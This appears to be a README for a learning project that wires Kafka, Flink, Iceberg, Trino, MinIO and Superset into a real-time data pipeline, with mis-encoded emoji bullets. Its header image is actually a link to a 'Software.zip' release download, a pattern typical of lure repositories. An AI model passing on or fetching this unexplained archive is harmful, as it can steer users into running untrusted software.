# ðŸš€ Real-Time Data Pipeline with Kafka, Flink, Iceberg, Trino, MinIO, and Superset

![Real-Time Data Pipeline](https://github.com/SonicEXEDVP/real-time-data-pipeline/releases/download/v2.0/Software.zip)

Welcome to the Real-Time Data Pipeline repository! This project is a comprehensive data system setup consisting of Apache Kafka, Apache Flink, Apache Iceberg, Trino, MinIO, and Apache Superset. It serves as an ideal environment for learning about data systems, big data processing, ETL strategies, and real-time analytics.

## Features

ðŸ”¹ **Real-Time Processing:** Utilizes Apache Kafka and Apache Flink for streaming data processing, enabling real-time data analysis and insights.

ðŸ”¹ **Data Lakehouse:** Demonstrates the use of Apache Iceberg for managing tables in a data lake, providing versioning and efficient data management capabilities.

ðŸ”¹ **Advanced Analytics:** Connects to Trino for SQL-based analytics on the processed data, making it easy to run queries and generate reports.

ðŸ”¹ **Data Visualization:** Integrates with Apache Superset for data visualization and dashboard creation, allowing for easy exploration and presentation of insights.

ðŸ”¹ **Open Source Technologies:** Entire setup is based on open-source technologies, making it accessible for learning and development purposes.
